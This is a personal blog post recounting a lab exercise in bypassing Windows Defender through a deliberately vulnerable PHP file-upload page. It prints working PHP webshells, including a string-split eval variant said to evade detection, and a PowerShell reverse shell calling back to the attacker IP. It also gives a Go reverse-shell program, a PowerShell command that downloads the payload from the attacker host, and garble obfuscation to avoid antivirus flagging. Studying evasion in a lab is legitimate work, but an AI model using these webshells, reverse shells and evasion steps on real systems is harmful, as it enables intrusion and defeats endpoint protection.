---
layout: post
title:  "My Experience bypassing Windows Defender"
date:   2021-12-19 21:35:00 +0100
categories: [windows, av, bypass, article]
---

# Goal
Bypass Windows Defender protections and get reverse shell.

# Preable
I know zero about AV evasion. Everything that it's written in this article is based on my experience, don't take my words for guaranted. I started the tests around the following date: `15/12/2021`


# Setup

| Role | Machine | IP |
| :--: | :-----: | :-:|
| Target | Windows 10 | 192.168.80.142 |
| Attacker | Kali Linux | 192.168.80.131 |

| Windows Software | Version |
| :--------------- | :----- |
| XAMPP | 3.3.0 |
| PHP | 8.0.13 |
| Apache | 2.4.51 |

| Linux Software |
| :------------- |
| curl |
| go |


## Directory tree

```
 |-phpuploads
  |-uploads/
  |-index.php
```

## Source

```php
//index.php

<?php
  ini_set('display_errors', 1);
  ini_set('display_startup_errors', 1);
  error_reporting(E_ALL);
  if (isset($_FILES['userfile'])){
	  $uploadfile = "./uploads/" . basename($_FILES['userfile']['name']);
	  if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)){
		  echo "File uploaded correctly";
		}else{
		  echo "couldn't upload file.";
		}
	}
?>

<!DOCTYPE html>
<html>
	<head>
		<title>PHP Tests</title>
	</head>

 	<body>
		<form enctype="multipart/form-data" method="POST">
			<input type="file" name="userfile" />
			<input type="submit" />
		</form>
 	</body>
</html>
```

---

The webserver hosted on the Windows machine will simply serve a php script that allows clients to upload files to later retreive them.

The webserver is vulnerable to arbitrary file upload, so the goal is to obtain a reverse shell or at least a webshell that can run command on the infected machine.

The Kali Linux machine is just my working machine.



# Functionality Check
Checks firsts, we have to send a file sample and trying to retreive it later.

![23bc99a820187c8cbd51c988d9383ada.png](/assets/23bc99a820187c8cbd51c988d9383ada.png)

This is how the webpage looks like. We could upload them from the browser but I'd prefer uploading them via  `curl`.
Assuming that we have a file called `test.txt`  in our current directory, we could upload it using the following command:

```bash
curl -s -F 'userfile=@test.txt' http://192.168.80.142/phpuploads/index.php
```

![6627ad47f1097a70807209dce05ecdbd.png](/assets/6627ad47f1097a70807209dce05ecdbd.png)

To check if we can retreive the file, we can just check it in the folder `uploads`.

```bash
curl -s http://192.168.80.142/phpuploads/uploads/test.txt
```

![7bf79e6b155f1f368a1cb1b1249af9a2.png](/assets/7bf79e6b155f1f368a1cb1b1249af9a2.png)

If every check that we made is positive, then we can start with the exercise.

To easy upload and check, I used the following bash command:

```bash
MYFILE="file/to/upload.ext";
curl -s -F "userfile=@$MYFILE" "http://192.168.80.142/phpuploads/index.php" &&
(echo -e -n "\nResult: ";
curl -s "http://192.168.80.142/phpuploads/uploads/$(basename $MYFILE)");
```

So in this way, I just have to change the content of the variable `MYFILE`.

![48f3a93de1a4f1ac1129c8aab591052b.png](/assets/48f3a93de1a4f1ac1129c8aab591052b.png)


# Narrative

## Filename alerts
I wanted to test out if some filenames will alert Windows Defender. So what I did was stesting a bunch of filename that could be suspicious but every single of them contains the following code:

```php
<?php echo "hello world"; ?>
```

These are the filename that I used:

| Filenames | 
| :-------- |
| webshell.php |
| reversesell.php |
| meterpreter.php |
| c99shell.php |
| cmd.php |
| payload.php |

For every request made, I was able to even execute those files.

![b26fde4ca56638851863f370b3d19319.png](/assets/b26fde4ca56638851863f370b3d19319.png)

![80af86754a48132c17809ca0b8ba48de.png](/assets/80af86754a48132c17809ca0b8ba48de.png)


None of them resulted into being flagged by the AV. 
To make sure, I ran Windows Defender on the upload folder.

![6fbe93a30f04f2d7a63522c6ff4b7403.png](/assets/6fbe93a30f04f2d7a63522c6ff4b7403.png)

![3af9da6979a07b05da958af9748ed688.png](/assets/3af9da6979a07b05da958af9748ed688.png)

So no current threats.

I wil **assume** that Windows Defender doesn't actually care about the filename, rather the content of it.

## Content alert
For this exercise, I will go from easy techniques to medium/complex one (as far as complex I can go of course).

Rules that I put myself for this exercise are:
- WebShell needs to execute system commands.
- WebShell should not hardcode the command to run (e.g.: `system('malicious command')`)
- The command should be sent from Client to Server. The WebShell should not fetch the command on other service (like performing an HTTP request to a server that we own).

For the first part of this exercise, I'm gonna use the `system` function to execute the command. 

I wanted to try with the simple ones, but first I'll show an example on how to understand that our WebShell got caught by Windows Defender:

I uploaded the following PHP script.

```php
<?php
	system($_GET['c']);
?>
```
And as soon as I tried to reach that file via curl, Windows Defender caught it.

![cf0d9c4fc113ad183bb36fd193999c89.png](/assets/cf0d9c4fc113ad183bb36fd193999c89.png)

And this is the output from my terminal:

![e53856ba93313bee1fa485756cf22114.png](/assets/e53856ba93313bee1fa485756cf22114.png)

So upload was successful, but execution failed.

Listed here (with the name as comment), I performed some mutation of the previous WebShell to figure out how little I can change to bypass Windows Defender. 

```php
<?php system($_GET['c']); ?> //SYS_GET_C
<?php system($_GET['foo']); ?> //SYS_GET_FOO
<?php system($_COOKIES['foo']); ?> //SYS_COOKIE_FOO
<?php system($_SERVER["HTTP_X_DATA"]); ?> //SYS_HEADER_DATA
<?php $LOL=$_GET; system($LOL['foo']);  ?> //VAR_SYS_GET_FOO
<?php $LOL='system($_GET["c"]);'; eval($LOL); ?> //STR_SYS_GET_C_EVAL
<?php $LOL="sy"."stem(\$_GET['c']);"; eval($LOL); ?> //BROKEN_SYS_GET_C_EVAL
```

Fun fact, every single WebShell got caught besides from `BROKEN_SYS_GET_C_EVAL` (the last one).
Apparently, breaking the string was enought to make me bypass Windows Defender.

![10e4b64505e98b57b0a1875aa35b0636.png](/assets/10e4b64505e98b57b0a1875aa35b0636.png)

I am already happy, but I wanna try to use other functions besides from `system`. So I tried with `exec`.
Keep in mind that `exec` doesn't output directly the data as `system` does, so we have to print it out on our own.

To check again, I tried with a simple one:

```php
<?php
	echo exec($_GET['c']);
?>
```
 and to my surprise, it worked.
 
![163571240be1e5671df0b318e7dd9986.png](/assets/163571240be1e5671df0b318e7dd9986.png)

![11e1aac72544ecb088b86244d5d1e5b7.png](/assets/11e1aac72544ecb088b86244d5d1e5b7.png)

I don't know why, but it worked. There's literally no obfuscation.
I wanna make the output a little bit better because `exec` returns only the first line of the output of the command, but by specifying an array it will put all the lines of the output inside that array.

```php
<?php
	$a=[];
	exec($_GET["c"], $a);
	echo implode("\n", $a);
?>
```

![8880595061bf8ca552731acf64cc289b.png](/assets/8880595061bf8ca552731acf64cc289b.png)

This tells me a lot. But I guess Windows Defender is not designed to catch this kind of attacks or Payloads, which is okay.

## Command alert
Not because our webshell sists there and gets execute means that we can perform malicious actions. It could be that if we try to perform or run suspicious commands, Windows Defender will stop us from executing them.

I'm gonna assume that we're using the `BROKEN_SYS_GET_C_EVAL` webshell. 

To try to trigger Windows Defender, I though about spawning a reverse shell. Here there are no rules besides from the fact Windows Defender should be on.

I started with a classic one from [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell):
```terminal
powershell -NoP -NonI -W Hidden -Exec Bypass -Command
New-Object System.Net.Sockets.TCPClient("192.168.80.131",8080);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2  = $sendback + "PS " + (pwd).Path + "> ";
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
};
$client.Close()
```
> In the terminal it's a oneliner, here I reported it with spaces and newlines to better see and understand what the payload is doing.

But no success. This is due to the fact that it gets detected by Windows Defender and we can see it in the Apache error logs:

![37a52f97baac575fc7962967d1c340a1.png](/assets/37a52f97baac575fc7962967d1c340a1.png)

So what I did was to just create an executable that is able to spawn the reverse shell for me.

I used golang for this purpose since I'm confident with it and also it's easy to perform [cross compile](https://en.wikipedia.org/wiki/Cross_compiler).

```go
package main
import ("os/exec"
        "os"
        "net")

func main(){
        beeboop, _:=net.Dial("tcp", os.Args[1])
        lol:=exec.Command(os.Args[2])
        lol.Stdin=beeboop
        lol.Stdout=beeboop
        lol.Stderr=beeboop
        lol.Run()
}
```

The program accepts two arguments:
- The address and port to connect to
- The binary to execute

Upon execution it contacts the address supplied, spawns a process and attaches the stdin, stdout, stderr of the process to the socket.
To compile on Linux for Windows:

```bash
env GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" reverse_shell.go
```

I renamed the executable in `general.exe` , uploaded the executable on a web server and downloaded it by using the following payload on our target:

```bash
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.80.131:8000/general.exe','general.exe')
```
> NOTE: Downloading payload by using `certutil.exe` caught Windows Defender attention. I didn't show the steps to just not make the article too long.

and then executing the downloaded file by passing the address of the attacking machine and the name of the programm to execute:

```terminal
.\general.exe 192.168.80.131:8080 powershell
```

And it luckly gets executed.

![811d5171da65af19ddbbabca6a472a67.png](/assets/811d5171da65af19ddbbabca6a472a67.png)

## Obfuscation
For whatever reason, after a while it got flagged again by Windows Defender.

![905c49c9afa7c794cbbcd6b0aed2d328.png](/assets/905c49c9afa7c794cbbcd6b0aed2d328.png)

Unfortunately, I wasn't able to find my way to obfuscate the executable so I had to use this wonderful tool called [garble](https://github.com/burrowers/garble) to compile golang code and obfuscate it. After installing it, all I did was to just simply run the compiling command but repleacing `go` with `garble`:

```bash
env GOOS=windows GOARCH=amd64 garble build -ldflags "-s -w" reverse_shell.go
```

And this time, Windows Defender does not flag our binary as malicious.

I'm not gonna cover the privilege escalation part simply because I am currently not skilled enough for this and also because I didn't set-up a privilege escalation vector on the Windows machine.

# Thanks 

A special thanks to my partner for every time she supported me into all of this madnes.

---

<blockquote class="twitter-tweet" data-lang="en" data-theme="dark"><p lang="en" dir="ltr">There may be blogs out there with &quot;facts about The Thing&quot;, but your unique value-add is &quot;facts about me apprehending Facts About The Thing&quot;, which can be especially useful for people already afflicted by expert blindness</p>&mdash; KURT W.K. (@thekurtwk) <a href="https://twitter.com/thekurtwk/status/1470936302426198030?ref_src=twsrc%5Etfw">December 15, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

Many thanks to KURT W.K. for giving me a valid point of view.

---
Thanks to Essbee, a polar bear that is living her best life through many high and lows.

